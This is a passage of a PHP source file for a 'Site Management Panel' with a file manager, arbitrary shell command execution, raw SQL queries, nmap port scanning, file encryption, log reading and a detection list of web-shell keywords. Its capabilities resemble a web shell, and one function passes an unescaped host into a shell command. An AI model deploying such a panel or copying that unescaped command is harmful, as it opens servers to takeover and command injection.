            logAction('FILE_CREATE', "Created file: $name");
            return 'File created successfully!';
        }
    }
    
    return 'Creation failed!';
}

// Delete file/folder
function deleteItem($path) {
    if (!file_exists($path)) {
        return 'Item not found!';
    }
    
    if (is_dir($path)) {
        if (rmdir($path)) {
            logAction('FOLDER_DELETE', "Deleted folder: " . basename($path));
            return 'Folder deleted successfully!';
        }
    } else {
        if (unlink($path)) {
            logAction('FILE_DELETE', "Deleted file: " . basename($path));
            return 'File deleted successfully!';
        }
    }
    
    return 'Deletion failed!';
}

// Handle file operations
$file_content = '';
$file_edit_message = '';
$operation_message = '';
$root_path = dirname(__DIR__);
$fm_path = isset($_GET['fm_path']) ? $_GET['fm_path'] : $root_path;
$fm_path = realpath($fm_path);
if ($fm_path === false || strpos($fm_path, $root_path) !== 0) {
    $fm_path = $root_path;
}

// Get search and sort parameters
$search_term = $_GET['search'] ?? '';
$sort_by = $_GET['sort'] ?? 'name';
$sort_order = $_GET['order'] ?? 'asc';

// Handle various file operations
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    requireAuth();
    
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        $operation_message = "Invalid security token!";
    } else {
        // File upload (single or multiple)
        if (isset($_POST['upload_file']) || isset($_POST['upload_files'])) {
            $operation_message = handleFileUpload($fm_path);
        }
        // File download
        elseif (isset($_POST['download_file']) && !empty($_POST['file_path'])) {
            $file_path = realpath($_POST['file_path']);
            if ($file_path && validatePath($file_path, $root_path) && is_file($file_path)) {
                downloadFile($file_path);
                exit;
            } else {
                $operation_message = 'Invalid file path!';
            }
        }
        // ZIP download
        elseif (isset($_POST['download_zip']) && !empty($_POST['selected_files'])) {
            $selected_files = json_decode($_POST['selected_files'], true);
            $valid_files = [];
            foreach ($selected_files as $file) {
                $file_path = realpath($file);
                if ($file_path && validatePath($file_path, $root_path) && is_file($file_path)) {
                    $valid_files[] = $file_path;
                }
            }
            if (!empty($valid_files)) {
                createZipDownload($valid_files, 'files_' . date('Y-m-d_H-i-s') . '.zip');
                exit;
            } else {
                $operation_message = 'No valid files selected!';
            }
        }
        // Rename item
        elseif (isset($_POST['rename_item']) && !empty($_POST['item_path']) && !empty($_POST['new_name'])) {
            $item_path = realpath($_POST['item_path']);
            $new_name = $_POST['new_name'];
            if ($item_path && validatePath($item_path, $root_path)) {
                $operation_message = renameItem($item_path, $new_name);
            } else {
                $operation_message = 'Invalid item path!';
            }
        }
        // Move item
        elseif (isset($_POST['move_item']) && !empty($_POST['item_path']) && !empty($_POST['destination_path'])) {
            $item_path = realpath($_POST['item_path']);
            $destination_path = realpath($_POST['destination_path']);
            if ($item_path && validatePath($item_path, $root_path) && 
                $destination_path && validatePath($destination_path, $root_path) && is_dir($destination_path)) {
                $operation_message = moveItem($item_path, $destination_path);
            } else {
                $operation_message = 'Invalid paths!';
            }
        }
        // Delete multiple items
        elseif (isset($_POST['delete_multiple']) && !empty($_POST['selected_items'])) {
            $selected_items = json_decode($_POST['selected_items'], true);
            $valid_items = [];
            foreach ($selected_items as $item) {
                $item_path = realpath($item);
                if ($item_path && validatePath($item_path, $root_path)) {
                    $valid_items[] = $item_path;
                }
            }
            if (!empty($valid_items)) {
                $operation_message = deleteMultipleItems($valid_items);
            } else {
                $operation_message = 'No valid items selected!';
            }
        }
        // Create new file
        elseif (isset($_POST['create_file']) && !empty($_POST['new_file_name'])) {
            $operation_message = createNewItem($fm_path, $_POST['new_file_name'], false);
        }
        // Create new folder
        elseif (isset($_POST['create_folder']) && !empty($_POST['new_folder_name'])) {
            $operation_message = createNewItem($fm_path, $_POST['new_folder_name'], true);
        }
        // Delete item
        elseif (isset($_POST['delete_item']) && !empty($_POST['item_path'])) {
            $item_path = realpath($_POST['item_path']);
            if (validatePath($item_path, $root_path)) {
                $operation_message = deleteItem($item_path);
            } else {
                $operation_message = 'Invalid path!';
            }
        }
        // Save file content
        elseif (isset($_POST['file_content'])) {
            $edit_file_path = realpath($_POST['edit_file_path'] ?? '');
            if ($edit_file_path && validatePath($edit_file_path, $root_path) && is_file($edit_file_path)) {
                if (file_put_contents($edit_file_path, $_POST['file_content'])) {
                    $file_edit_message = 'File saved successfully!';
                    logAction('FILE_EDIT', "Edited: " . basename($edit_file_path));
                } else {
                    $file_edit_message = 'Failed to save file!';
                }
            } else {
                $file_edit_message = 'Invalid file!';
            }
        }
        // Execute command
        elseif (isset($_POST['execute_command']) && !empty($_POST['command'])) {
            $command = sanitizeInput($_POST['command']);
            $command_result = executeCommand($command);
            $operation_message = "Command executed: $command\nResult:\n$command_result";
        }
        // Database operations
        elseif (isset($_POST['db_query']) && !empty($_POST['db_query'])) {
            $query = $_POST['db_query'];
            $result = executeDatabaseQuery($query);
            if ($result !== false) {
                $operation_message = "Query executed successfully. Rows: " . count($result);
            } else {
                $operation_message = "Database query failed!";
            }
        }
        // File encryption
        elseif (isset($_POST['encrypt_file']) && !empty($_POST['encrypt_file_path']) && !empty($_POST['encrypt_password'])) {
            $file_path = realpath($_POST['encrypt_file_path']);
            $password = $_POST['encrypt_password'];
            if ($file_path && validatePath($file_path, $root_path)) {
                if (encryptFile($file_path, $password)) {
                    $operation_message = 'File encrypted successfully!';
                } else {
                    $operation_message = 'File encryption failed!';
                }
            } else {
                $operation_message = 'Invalid file path!';
            }
        }
        // File decryption
        elseif (isset($_POST['decrypt_file']) && !empty($_POST['decrypt_file_path']) && !empty($_POST['decrypt_password'])) {
            $file_path = realpath($_POST['decrypt_file_path']);
            $password = $_POST['decrypt_password'];
            if ($file_path && validatePath($file_path, $root_path)) {
                if (decryptFile($file_path, $password)) {
                    $operation_message = 'File decrypted successfully!';
                } else {
                    $operation_message = 'File decryption failed!';
                }
            } else {
                $operation_message = 'Invalid file path!';
            }
        }
        // Create backup
        elseif (isset($_POST['create_backup'])) {
            $backup_file = createBackup();
            if ($backup_file) {
                $operation_message = "Backup created successfully: $backup_file";
            } else {
                $operation_message = "Backup creation failed!";
            }
        }
        // Port scan
        elseif (isset($_POST['scan_ports']) && !empty($_POST['scan_host'])) {
            $host = sanitizeInput($_POST['scan_host']);
            $ports = isset($_POST['scan_ports_list']) ? explode(',', $_POST['scan_ports_list']) : [22, 80, 443, 3389];
            $scan_result = scanPorts($host, array_map('intval', $ports));
            $operation_message = "Port scan results for $host:\n" . print_r($scan_result, true);
        }
        // User management
        elseif (isset($_POST['create_user']) && !empty($_POST['username']) && !empty($_POST['password'])) {
            $username = sanitizeInput($_POST['username']);
            $password = $_POST['password'];
            $role = sanitizeInput($_POST['user_role'] ?? 'user');
            if (createUser($username, $password, $role)) {
                $operation_message = "User '$username' created successfully!";
            } else {
                $operation_message = "Failed to create user!";
            }
        }
        elseif (isset($_POST['update_user_role']) && !empty($_POST['username']) && !empty($_POST['new_role'])) {
            $username = sanitizeInput($_POST['username']);
            $new_role = sanitizeInput($_POST['new_role']);
            if (updateUserRole($username, $new_role)) {
                $operation_message = "User role updated successfully!";
            } else {
                $operation_message = "Failed to update user role!";
            }
        }
        elseif (isset($_POST['toggle_user_status']) && !empty($_POST['username'])) {
            $username = sanitizeInput($_POST['username']);
            if (toggleUserStatus($username)) {
                $operation_message = "User status updated successfully!";
            } else {
                $operation_message = "Failed to update user status!";
            }
        }
        // File search
        elseif (isset($_POST['search_files']) && !empty($_POST['search_term'])) {
            $search_term = $_POST['search_term'];
            $results = findFilesByContent($search_term);
            $operation_message = "Found " . count($results) . " files containing '$search_term':\n" . implode("\n", $results);
        }
        // Mass file operations
        elseif (isset($_POST['mass_operation']) && !empty($_POST['operation']) && !empty($_POST['pattern'])) {
            $operation = sanitizeInput($_POST['operation']);
            $pattern = sanitizeInput($_POST['pattern']);
            $results = massFileOperation($operation, $pattern);
            $operation_message = "Mass operation completed. Results:\n" . implode("\n", $results);
        }
        // Email notification
        elseif (isset($_POST['send_notification']) && !empty($_POST['email_subject']) && !empty($_POST['email_message'])) {
            $subject = sanitizeInput($_POST['email_subject']);
            $message = $_POST['email_message'];
            $to = sanitizeInput($_POST['email_to'] ?? 'admin@example.com');
            if (sendEmailNotification($subject, $message, $to)) {
                $operation_message = "Email notification sent successfully!";
            } else {
                $operation_message = "Failed to send email notification!";
            }
        }
    }
}

// Handle file editing
if (isset($_GET['edit_file'])) {
    requireAuth();
    $edit_file = $_GET['edit_file'];
    $edit_file_path = realpath($edit_file);
    if ($edit_file_path && validatePath($edit_file_path, $root_path) && is_file($edit_file_path)) {
        $file_content = htmlspecialchars(file_get_contents($edit_file_path));
    } else {
        $file_edit_message = 'Invalid file!';
    }
}

$site_stats = getSiteStats();

// ==================== NEW ADVANCED FEATURES ====================

// Advanced File Manager Functions
function getFileManagerData($path = '.') {
    $realPath = realpath($path);
    if (!$realPath) return false;
    
    $files = [];
    $directories = [];
    
    if (is_dir($realPath)) {
        $iterator = new DirectoryIterator($realPath);
        foreach ($iterator as $file) {
            if ($file->isDot()) continue;
            
            $fileInfo = [
                'name' => $file->getFilename(),
                'path' => $file->getRealPath(),
                'size' => $file->isFile() ? $file->getSize() : 0,
                'modified' => $file->getMTime(),
                'permissions' => substr(sprintf('%o', $file->getPerms()), -4),
                'type' => $file->isDir() ? 'directory' : 'file',
                'extension' => $file->isFile() ? $file->getExtension() : ''
            ];
            
            if ($file->isDir()) {
                $directories[] = $fileInfo;
            } else {
                $files[] = $fileInfo;
            }
        }
    }
    
    return [
        'current_path' => $realPath,
        'parent_path' => dirname($realPath),
        'directories' => $directories,
        'files' => $files
    ];
}

function uploadFile($file, $destination) {
    if (!isset($file['tmp_name']) || !is_uploaded_file($file['tmp_name'])) {
        return false;
    }
    
    $targetPath = $destination . '/' . basename($file['name']);
    if (move_uploaded_file($file['tmp_name'], $targetPath)) {
        logAction('FILE_UPLOAD', "Uploaded: " . basename($file['name']));
        return true;
    }
    return false;
}

// Advanced System Monitoring
function getDetailedSystemInfo() {
    $info = getSystemInfo();
    
    // Add more detailed information
    $info['disk_usage'] = getDiskUsage();
    $info['memory_detailed'] = getDetailedMemoryInfo();
    $info['network_stats'] = getNetworkStatistics();
    $info['running_services'] = getRunningServices();
    $info['environment_vars'] = getEnvironmentVariables();
    
    return $info;
}

function getDiskUsage() {
    $usage = [];
    if (function_exists('exec')) {
        exec('df -h', $output);
        foreach ($output as $line) {
            if (strpos($line, '/') !== false) {
                $parts = preg_split('/\s+/', $line);
                if (count($parts) >= 6) {
                    $usage[] = [
                        'filesystem' => $parts[0],
                        'size' => $parts[1],
                        'used' => $parts[2],
                        'available' => $parts[3],
                        'use_percent' => $parts[4],
                        'mounted_on' => $parts[5]
                    ];
                }
            }
        }
    }
    return $usage;
}

function getDetailedMemoryInfo() {
    $memory = [];
    if (function_exists('exec')) {
        exec('free -m', $output);
        foreach ($output as $line) {
            if (strpos($line, 'Mem:') === 0 || strpos($line, 'Swap:') === 0) {
                $parts = preg_split('/\s+/', $line);
                if (count($parts) >= 4) {
                    $memory[strtolower(str_replace(':', '', $parts[0]))] = [
                        'total' => $parts[1],
                        'used' => $parts[2],
                        'free' => $parts[3],
                        'shared' => isset($parts[4]) ? $parts[4] : 0,
                        'buff_cache' => isset($parts[5]) ? $parts[5] : 0,
                        'available' => isset($parts[6]) ? $parts[6] : 0
                    ];
                }
            }
        }
    }
    return $memory;
}

function getNetworkStatistics() {
    $stats = [];
    if (function_exists('exec')) {
        exec('netstat -i', $output);
        foreach ($output as $line) {
            if (strpos($line, 'Iface') === false && trim($line) !== '') {
                $parts = preg_split('/\s+/', $line);
                if (count($parts) >= 9) {
                    $stats[] = [
                        'interface' => $parts[0],
                        'mtu' => $parts[1],
                        'rx_ok' => $parts[2],
                        'rx_err' => $parts[3],
                        'rx_drp' => $parts[4],
                        'rx_ovr' => $parts[5],
                        'tx_ok' => $parts[6],
                        'tx_err' => $parts[7],
                        'tx_drp' => $parts[8],
                        'tx_ovr' => isset($parts[9]) ? $parts[9] : 0,
                        'flg' => isset($parts[10]) ? $parts[10] : ''
                    ];
                }
            }
        }
    }
    return $stats;
}

function getRunningServices() {
    $services = [];
    if (function_exists('exec')) {
        exec('systemctl list-units --type=service --state=running', $output);
        foreach ($output as $line) {
            if (strpos($line, '.service') !== false) {
                $parts = preg_split('/\s+/', $line);
                if (count($parts) >= 4) {
                    $services[] = [
                        'name' => $parts[0],
                        'load' => $parts[1],
                        'active' => $parts[2],
                        'sub' => $parts[3],
                        'description' => implode(' ', array_slice($parts, 4))
                    ];
                }
            }
        }
    }
    return $services;
}

function getEnvironmentVariables() {
    $envVars = [];
    $importantVars = ['PATH', 'HOME', 'USER', 'SHELL', 'PWD', 'LANG', 'DISPLAY'];
    
    foreach ($importantVars as $var) {
        if (isset($_ENV[$var])) {
            $envVars[$var] = $_ENV[$var];
        }
    }
    
    return $envVars;
}

// Advanced Network Tools
function pingHost($host, $count = 4) {
    if (!function_exists('exec')) return "Command execution not available";
    
    $command = "ping -c $count " . escapeshellarg($host);
    exec($command, $output, $return_var);
    
    logAction('PING_HOST', "Pinged: $host");
    return implode("\n", $output);
}

function tracerouteHost($host) {
    if (!function_exists('exec')) return "Command execution not available";
    
    $command = "traceroute " . escapeshellarg($host);
    exec($command, $output, $return_var);
    
    logAction('TRACEROUTE', "Traceroute to: $host");
    return implode("\n", $output);
}

function getOpenPorts($host = 'localhost') {
    if (!function_exists('exec')) return "Command execution not available";
    
    $command = "nmap -p- --open $host 2>/dev/null";
    exec($command, $output, $return_var);
    
    logAction('PORT_SCAN', "Scanned ports on: $host");
    return implode("\n", $output);
}

// Advanced Security Tools
function checkFilePermissions($path) {
    $permissions = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    
    foreach ($iterator as $file) {
        $perms = $file->getPerms();
        $octal = substr(sprintf('%o', $perms), -4);
        
        if ($octal[3] === '7' || $octal[3] === '6') { // World writable or executable
            $permissions[] = [
                'path' => $file->getRealPath(),
                'permissions' => $octal,
                'owner' => function_exists('posix_getpwuid') ? posix_getpwuid($file->getOwner())['name'] ?? 'unknown' : 'unknown',
                'group' => function_exists('posix_getgrgid') ? posix_getgrgid($file->getGroup())['name'] ?? 'unknown' : 'unknown'
            ];
        }
    }
    
    return $permissions;
}

function findSuspiciousFiles($directory = '.') {
    $suspicious = [];
    $patterns = [
        '/\.php$/i',
        '/\.phtml$/i',
        '/\.php3$/i',
        '/\.php4$/i',
        '/\.php5$/i',
        '/\.phps$/i'
    ];
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            foreach ($patterns as $pattern) {
                if (preg_match($pattern, $file->getFilename())) {
                    $content = file_get_contents($file->getRealPath());
                    $suspiciousKeywords = ['eval', 'base64_decode', 'system', 'exec', 'shell_exec', 'passthru'];
                    
                    foreach ($suspiciousKeywords as $keyword) {
                        if (strpos($content, $keyword) !== false) {
                            $suspicious[] = [
                                'file' => $file->getRealPath(),
                                'keyword' => $keyword,
                                'size' => $file->getSize(),
                                'modified' => $file->getMTime()
                            ];
                            break;
                        }
                    }
                }
            }
        }
    }
    
    return $suspicious;
}

// Advanced Database Tools
function getDatabaseSize() {
    $pdo = getDatabaseConnection();
    if (!$pdo) return false;
    
    $query = "SELECT 
        table_schema AS 'Database',
        ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
        FROM information_schema.tables 
        WHERE table_schema = ?";
    
    $stmt = $pdo->prepare($query);
    $stmt->execute([DB_NAME]);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function optimizeDatabase() {
    $pdo = getDatabaseConnection();
    if (!$pdo) return false;
    
    $tables = getDatabaseTables();
    $optimized = 0;
    
    foreach ($tables as $table) {
        $tableName = array_values($table)[0];
        $query = "OPTIMIZE TABLE `$tableName`";
        try {
            $pdo->exec($query);
            $optimized++;
        } catch (PDOException $e) {
            // Continue with other tables
        }
    }
    
    logAction('DATABASE_OPTIMIZATION', "Optimized $optimized tables");
    return $optimized;
}

// Advanced Logging and Monitoring
function getSystemLogs($lines = 100) {
    $logs = [];
    $logFiles = [
        '/var/log/syslog',
        '/var/log/messages',
        '/var/log/auth.log',
        '/var/log/kern.log'
    ];
    
    foreach ($logFiles as $logFile) {
        if (file_exists($logFile) && is_readable($logFile)) {
            $command = "tail -n $lines " . escapeshellarg($logFile);
            exec($command, $output);
            $logs[basename($logFile)] = $output;
        }
    }
    
    return $logs;
}

// ==================== ENHANCED SECURITY FEATURES ====================

// IP Whitelist Management
function getWhitelistedIPs() {
    $whitelist_file = 'ip_whitelist.json';
    if (!file_exists($whitelist_file)) {
        return [];
    }
    return json_decode(file_get_contents($whitelist_file), true) ?: [];
}

function addToWhitelist($ip) {
    $whitelist = getWhitelistedIPs();
    if (!in_array($ip, $whitelist)) {
        $whitelist[] = $ip;
        file_put_contents('ip_whitelist.json', json_encode($whitelist, JSON_PRETTY_PRINT));
        logAction('IP_WHITELIST_ADD', "Added IP to whitelist: $ip");
        return true;
    }
    return false;
}

function removeFromWhitelist($ip) {
    $whitelist = getWhitelistedIPs();
    $key = array_search($ip, $whitelist);
    if ($key !== false) {
        unset($whitelist[$key]);
        file_put_contents('ip_whitelist.json', json_encode(array_values($whitelist), JSON_PRETTY_PRINT));
        logAction('IP_WHITELIST_REMOVE', "Removed IP from whitelist: $ip");
        return true;
    }
    return false;
}

function isIPWhitelisted($ip) {
    if (!ENABLE_IP_WHITELIST) return true;
    $whitelist = getWhitelistedIPs();
    return in_array($ip, $whitelist);
}

// Login Attempt Tracking
function getLoginAttempts($ip) {
    $attempts_file = 'login_attempts.json';
    if (!file_exists($attempts_file)) {
        return [];
    }
    $attempts = json_decode(file_get_contents($attempts_file), true) ?: [];
    return $attempts[$ip] ?? [];
}

function recordLoginAttempt($ip, $success = false) {
    $attempts_file = 'login_attempts.json';
    $attempts = json_decode(file_get_contents($attempts_file), true) ?: [];
    
    if (!isset($attempts[$ip])) {
        $attempts[$ip] = ['count' => 0, 'last_attempt' => 0, 'locked_until' => 0];
    }
    
    $attempts[$ip]['count']++;
    $attempts[$ip]['last_attempt'] = time();
    
    if (!$success && $attempts[$ip]['count'] >= MAX_LOGIN_ATTEMPTS) {
        $attempts[$ip]['locked_until'] = time() + LOGIN_LOCKOUT_TIME;
    }
    
    if ($success) {
        $attempts[$ip]['count'] = 0;
        $attempts[$ip]['locked_until'] = 0;
    }
    
    file_put_contents($attempts_file, json_encode($attempts, JSON_PRETTY_PRINT));
}

function isIPLocked($ip) {
    $attempts = getLoginAttempts($ip);
    return isset($attempts['locked_until']) && $attempts['locked_until'] > time();
}

// Session Fingerprinting
function generateSessionFingerprint() {
    $components = [
        $_SERVER['HTTP_USER_AGENT'] ?? '',
        $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
        $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
        $_SERVER['REMOTE_ADDR'] ?? ''
    ];
    return hash('sha256', implode('|', $components));
}

function validateSessionFingerprint() {
    if (!ENABLE_SESSION_FINGERPRINTING) return true;
    
    if (!isset($_SESSION['fingerprint'])) {
        return false;
    }
    
    $current_fingerprint = generateSessionFingerprint();
    return hash_equals($_SESSION['fingerprint'], $current_fingerprint);
}

// Advanced Logging
function getSecurityLogs($lines = 100) {
    $log_file = 'security.log';
    if (!file_exists($log_file)) {
        return [];
    }
    
    $logs = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return array_slice(array_reverse($logs), 0, $lines);
}

function logSecurityEvent($event, $details = '') {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $log_entry = "[$timestamp] SECURITY: $event | IP: $ip | Details: $details | User-Agent: $user_agent" . PHP_EOL;
    file_put_contents('security.log', $log_entry, FILE_APPEND | LOCK_EX);
}

// File Integrity Monitoring
function calculateFileHash($filepath) {
    if (!file_exists($filepath)) return null;
    return hash_file('sha256', $filepath);
}

function monitorFileIntegrity($directory = '.') {
    $integrity_file = 'file_integrity.json';
    $current_hashes = [];
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $current_hashes[$file->getRealPath()] = calculateFileHash($file->getRealPath());
        }
    }
    
    $previous_hashes = [];
    if (file_exists($integrity_file)) {
        $previous_hashes = json_decode(file_get_contents($integrity_file), true) ?: [];
    }
    
    $changes = [];
    foreach ($current_hashes as $file => $hash) {
        if (!isset($previous_hashes[$file])) {
            $changes[] = ['file' => $file, 'change' => 'added', 'hash' => $hash];
        } elseif ($previous_hashes[$file] !== $hash) {
            $changes[] = ['file' => $file, 'change' => 'modified', 'hash' => $hash];
        }
    }
    
    foreach ($previous_hashes as $file => $hash) {
        if (!isset($current_hashes[$file])) {
            $changes[] = ['file' => $file, 'change' => 'deleted', 'hash' => $hash];
        }
    }
    
    file_put_contents($integrity_file, json_encode($current_hashes, JSON_PRETTY_PRINT));
    
    if (!empty($changes)) {
        logSecurityEvent('FILE_INTEGRITY_CHANGE', json_encode($changes));
    }
    
    return $changes;
}

// Advanced Threat Detection
function detectSuspiciousActivity() {
    $suspicious_activities = [];
    
    // Check for multiple failed login attempts
    $attempts_file = 'login_attempts.json';
    if (file_exists($attempts_file)) {
        $attempts = json_decode(file_get_contents($attempts_file), true) ?: [];
        foreach ($attempts as $ip => $data) {
            if ($data['count'] >= MAX_LOGIN_ATTEMPTS) {
                $suspicious_activities[] = [
                    'type' => 'brute_force',
                    'ip' => $ip,
                    'attempts' => $data['count'],
                    'severity' => 'high'
                ];
            }
        }
    }
    
    // Check for suspicious file modifications
    $integrity_changes = monitorFileIntegrity();
    if (count($integrity_changes) > 10) {
        $suspicious_activities[] = [
            'type' => 'mass_file_changes',
            'count' => count($integrity_changes),
            'severity' => 'medium'
        ];
    }
    
    // Check for unusual access patterns
    $access_log = 'access.log';
    if (file_exists($access_log)) {
        $recent_access = file($access_log, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $recent_access = array_slice($recent_access, -100); // Last 100 entries
        
        $ip_counts = [];
        foreach ($recent_access as $entry) {
            if (preg_match('/IP: (\S+)/', $entry, $matches)) {
                $ip = $matches[1];
                $ip_counts[$ip] = ($ip_counts[$ip] ?? 0) + 1;
            }
        }
        
        foreach ($ip_counts as $ip => $count) {
            if ($count > 50) { // More than 50 requests in recent history
                $suspicious_activities[] = [
                    'type' => 'unusual_access',
                    'ip' => $ip,
                    'requests' => $count,
                    'severity' => 'medium'
                ];
            }
        }
    }
    
    return $suspicious_activities;
}

// Get advanced data
$system_info = getSystemInfo();
$processes = getProcessList();
$network_interfaces = getNetworkInterfaces();
$log_analysis = analyzeLogs();
$db_tables = getDatabaseTables();
$users = getAllUsers();
$real_time_stats = getRealTimeStats();

// Get new advanced data
$detailed_system_info = getDetailedSystemInfo();
$file_manager_data = getFileManagerData();
$suspicious_files = findSuspiciousFiles();
$db_size = getDatabaseSize();
$system_logs = getSystemLogs();

// Get security data
$whitelisted_ips = getWhitelistedIPs();
$security_logs = getSecurityLogs();
$suspicious_activities = detectSuspiciousActivity();
$file_integrity_changes = monitorFileIntegrity();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Management Panel</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- CodeMirror CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/monokai.min.css">
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
        }
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
            background: white; 
            padding: 30px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
        }
        .header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-bottom: 30px; 
            border-bottom: 3px solid #eee; 
            padding-bottom: 20px; 
        }
        .header h1 { 
            color: #333; 
            margin: 0; 
            font-size: 2.5em;
            background: linear-gradient(45deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .auth-section {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 20px; 
            margin-bottom: 30px; 
        }
        .stat-card { 
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%); 
            padding: 25px; 
            border-radius: 12px; 
            text-align: center; 
            border-left: 4px solid #007bff;
            transition: transform 0.3s ease;
        }
        .stat-card:hover { transform: translateY(-5px); }
        .stat-number { 
            font-size: 28px; 
            font-weight: bold; 
            color: #007bff; 
            margin-bottom: 5px;
        }
        .stat-label { color: #666; font-weight: 500; }
        .danger-zone { 
            background: linear-gradient(135deg, #fff5f5 0%, #ffe6e6 100%); 
            border: 2px solid #dc3545; 
            border-radius: 15px; 
            padding: 25px; 
            margin-top: 30px; 
        }
        .danger-zone h3 { 
            color: #dc3545; 
            margin-top: 0; 
            font-size: 1.5em;
        }
        .btn { 
            padding: 12px 24px; 
            border: none; 
            border-radius: 8px; 
            cursor: pointer; 
            font-size: 14px; 
            font-weight: 600;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s ease;
            margin: 2px;
        }
        .btn-primary { background: linear-gradient(45deg, #007bff, #0056b3); color: white; }
        .btn-danger { background: linear-gradient(45deg, #dc3545, #c82333); color: white; }
        .btn-success { background: linear-gradient(45deg, #28a745, #1e7e34); color: white; }
        .btn-warning { background: linear-gradient(45deg, #ffc107, #e0a800); color: #212529; }
        .btn:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 5px 15px rgba(0,0,0,0.2); 
        }
        .form-group { margin-bottom: 20px; }
        label { 
            display: block; 
            margin-bottom: 8px; 
            font-weight: 600; 
            color: #333;
        }
        input[type="text"], input[type="password"], textarea { 
            width: 100%; 
            padding: 12px; 
            border: 2px solid #ddd; 
            border-radius: 8px; 
            font-size: 14px;
            transition: border-color 0.3s ease;
        }
        input[type="text"]:focus, input[type="password"]:focus, textarea:focus {
            outline: none;
            border-color: #007bff;
            box-shadow: 0 0 0 3px rgba(0,123,255,0.1);
        }
        .warning { 
            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%); 
            border: 2px solid #ffc107; 
            color: #856404; 
            padding: 20px; 
            border-radius: 10px; 
            margin-bottom: 20px; 
            font-weight: 500;
        }
        .message { 
            padding: 15px 20px; 
            border-radius: 8px; 
            margin-bottom: 20px; 
            font-weight: 500;
        }
        .message.success { 
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%); 
            border: 2px solid #28a745; 
            color: #155724; 
        }
        .message.error { 
            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%); 
            border: 2px solid #dc3545; 
            color: #721c24; 
        }
        .file-manager {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 25px;
            margin-top: 30px;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .file-table th {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 15px;
            text-align: left;
            font-weight: 600;
        }
        .file-table td {
            padding: 12px 15px;
            border-bottom: 1px solid #eee;
        }
        .file-table tr:hover {
            background: #f8f9fa;
        }
        .file-actions {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        .login-form {
            max-width: 400px;
            margin: 100px auto;
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .login-form h2 {
            text-align: center;
            margin-bottom: 30px;
            color: #333;
        }
        .responsive-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }
        .tab-navigation {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
        }
        .tab-btn {
            padding: 10px 20px;
            border: none;
            background: #f8f9fa;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        .tab-btn:hover {
            background: #e9ecef;
            transform: translateY(-2px);
        }
        .tab-btn.active {
            background: linear-gradient(45deg, #007bff, #0056b3);
            color: white;
        }
        .tab-content {
            display: none;
            padding: 20px 0;
        }
        .tab-content.active {
            display: block;
        }
        .info-card {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            border-left: 4px solid #007bff;
        }
        .info-card h4 {
            margin-top: 0;
            color: #333;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
        }
        .info-card p {
            margin: 8px 0;
            color: #666;
        }
        .info-card ul {
            margin: 10px 0;
            padding-left: 20px;
        }
        .info-card li {
            margin: 5px 0;
            color: #666;
        }
        .info-card small {
            color: #999;
            font-style: italic;
        }
        
        /* Enhanced File Manager Styles */
        .file-manager {
            background: #f8f9fa;
            border-radius: 12px;
